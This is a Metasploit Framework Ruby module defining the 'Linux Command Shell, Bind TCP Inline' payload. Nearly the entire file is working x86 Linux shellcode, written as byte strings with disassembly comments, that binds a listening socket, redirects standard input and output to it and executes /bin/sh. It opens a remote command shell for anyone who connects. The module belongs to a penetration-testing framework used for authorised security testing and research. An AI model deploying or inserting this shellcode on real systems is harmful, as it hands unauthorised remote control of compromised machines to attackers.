##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Linux
module X86

module ShellBindTcp

	include Msf::Payload::Single
	include Msf::Payload::Linux

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Bind TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection and spawn a command shell',
			'Author'        => 'Ramon de Carvalho Valle <ramon@risesecurity.org>',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LPORT'    => [ 21, 'n' ],
						},
					'Payload' =>
							"\x31\xdb"             +#   xorl    %ebx,%ebx                  #
							"\xf7\xe3"             +#   mull    %ebx                       #
							"\x53"                 +#   pushl   %ebx                       #
							"\x43"                 +#   incl    %ebx                       #
							"\x53"                 +#   pushl   %ebx                       #
							"\x6a\x02"             +#   pushl   $0x02                      #
							"\x89\xe1"             +#   movl    %esp,%ecx                  #
							"\xb0\x66"             +#   movb    $0x66,%al                  #
							"\xcd\x80"             +#   int     $0x80                      #
							"\x5b"                 +#   popl    %ebx                       #
							"\x5e"                 +#   popl    %esi                       #
							"\x52"                 +#   pushl   %edx                       #
							"\x68\xff\x02\x04\xd2" +#   pushl   $0xd20402ff                #
							"\x6a\x10"             +#   pushl   $0x10                      #
							"\x51"                 +#   pushl   %ecx                       #
							"\x50"                 +#   pushl   %eax                       #
							"\x89\xe1"             +#   movl    %esp,%ecx                  #
							"\x6a\x66"             +#   pushl   $0x66                      #
							"\x58"                 +#   popl    %eax                       #
							"\xcd\x80"             +#   int     $0x80                      #
							"\x89\x41\x04"         +#   movl    %eax,0x04(%ecx)            #
							"\xb3\x04"             +#   movb    $0x04,%bl                  #
							"\xb0\x66"             +#   movb    $0x66,%al                  #
							"\xcd\x80"             +#   int     $0x80                      #
							"\x43"                 +#   incl    %ebx                       #
							"\xb0\x66"             +#   movb    $0x66,%al                  #
							"\xcd\x80"             +#   int     $0x80                      #
							"\x93"                 +#   xchgl   %eax,%ebx                  #
							"\x59"                 +#   popl    %ecx                       #
							"\x6a\x3f"             +#   pushl   $0x3f                      #
							"\x58"                 +#   popl    %eax                       #
							"\xcd\x80"             +#   int     $0x80                      #
							"\x49"                 +#   decl    %ecx                       #
							"\x79\xf8"             +#   jns     <bndsockcode+50>           #
							"\x68\x2f\x2f\x73\x68" +#   pushl   $0x68732f2f                #
							"\x68\x2f\x62\x69\x6e" +#   pushl   $0x6e69622f                #
							"\x89\xe3"             +#   movl    %esp,%ebx                  #
							"\x50"                 +#   pushl   %eax                       #
							"\x53"                 +#   pushl   %ebx                       #
							"\x89\xe1"             +#   movl    %esp,%ecx                  #
							"\xb0\x0b"             +#   movb    $0x0b,%al                  #
							"\xcd\x80"              #   int     $0x80                      #
				}
			))
	end

end

end end end end end
